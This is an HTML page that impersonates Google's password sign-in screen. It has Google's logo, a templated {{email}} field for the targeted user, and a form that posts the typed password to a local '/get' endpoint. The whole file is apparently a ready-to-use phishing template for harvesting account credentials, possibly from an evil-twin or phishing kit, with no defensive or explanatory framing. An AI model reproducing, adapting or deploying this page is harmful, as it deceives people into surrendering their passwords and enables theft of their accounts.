<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Password</title>
<style>
body { background-color: #000; font-family: sans-serif; color: #fff; margin:0; padding:0; }
.login-container { width:85%; margin:50px auto; padding:20px; border-radius:5px; text-align:left; }

/* Google logo */
#google-logo {
  display: block;
  margin: 0 auto 20px auto;
  width: 140px;
  height: 35px;
}

.g-h1 { font-size:32px; font-weight:200; margin-bottom:10px; text-align:center; }
.g-h2 { font-size:17px; font-weight:200; margin-bottom:20px; text-align:center; }

/* Email box with avatar */
.email-box {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  padding: 2px 2px;
  border: 1px solid #fff;
  border-radius: 999px;
  background-color: transparent;
  margin-bottom: 45px;
  font-size: 16px;
}

.email-avatar {
  width: 22px;
  height: 22px;
}

/* Downward triangle */
.email-box svg.triangle {
  width: 12px;
  height: 12px;
  fill: #fff;
}

.g-input { width:95%; height:40px; padding:5px 12px; margin-bottom:15px; border:none; border-radius:5px; color:#fff; background-color:transparent; box-shadow:0 0 0 0.8px #fff inset; font-size:16px; }
.gbtn-primary { border:none; margin-top:6px; margin-bottom:6px; height:36px; border-radius:4px; font-size:15px; font-weight:500; padding:0 24px; background-color:rgb(26,115,232); color:#fff; cursor:pointer; }
.button-container { display:flex; justify-content:space-between; align-items:center; }
.create-account { color:#1a73e8; text-decoration:none; font-size:15px; }

/* Transparent custom checkbox */
input[type="checkbox"] {
  appearance: none;
  -webkit-appearance: none;
  width: 16px;
  height: 16px;
  border: 2px solid #fff;
  border-radius: 4px;
  background: transparent;
  cursor: pointer;
  position: relative;
}

/* Checked state */
input[type="checkbox"]:checked {
  background: rgb(26,115,232);
  border-color: rgb(26,115,232);
}

/* Classic tick mark */
input[type="checkbox"]:checked::after {
  content: "";
  position: absolute;
  left: 4px;
  top: 0px;
  width: 4px;
  height: 8px;
  border: solid black;
  border-width: 0 2px 2px 0;
  transform: rotate(45deg);
}
</style>
</head>
<body>
<div class="login-container">

  <!-- Google logo -->
  <svg id="google-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75 24" aria-hidden="true">
    <g fill="none">
      <path fill="#EA4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
      <path fill="#34A853" d="M58.193.67h2.564v17.44h-2.564z"></path>
      <path fill="#4285F4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
      <path fill="#F4B400" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
      <path fill="#EA4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
      <path fill="#4285F4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
    </g>
  </svg>

  <!-- Welcome heading -->
  <h1 class="g-h1"><b>Welcome</b></h1>

  <!-- Email with avatar box -->
  <div class="email-box">
    <svg class="email-avatar" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
      <circle cx="12" cy="12" r="12" fill="gray"/>
      <circle cx="12" cy="9" r="3" fill="white"/>
      <path d="M6 20c0-3.3 2.7-6 6-6s6 2.7 6 6" fill="white"/>
    </svg>

    {{email}}

    <svg class="triangle" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
      <path d="M7 10l5 5 5-5z"/>
    </svg>
  </div>

  <form action="/get" method="POST">
    <input name="password" id="password" type="password" class="g-input" placeholder="Enter your password" required>

    <div style="width:95%; margin:0 auto 15px auto; display:flex; align-items:center; gap:6px; font-size:14px;">
      <input type="checkbox" id="showPass">
      <label for="showPass" style="cursor:pointer;">Show password</label>
    </div>

    <div class="button-container">
      <a class="create-account" href="#">Forgot Password?</a>
      <button class="gbtn-primary" type="submit">Next</button>
    </div>
  </form>
</div>

<script>
const passwordField = document.getElementById("password");
const showPass = document.getElementById("showPass");

showPass.addEventListener("change", function() {
  passwordField.type = this.checked ? "text" : "password";
});
</script>
</body>
</html>
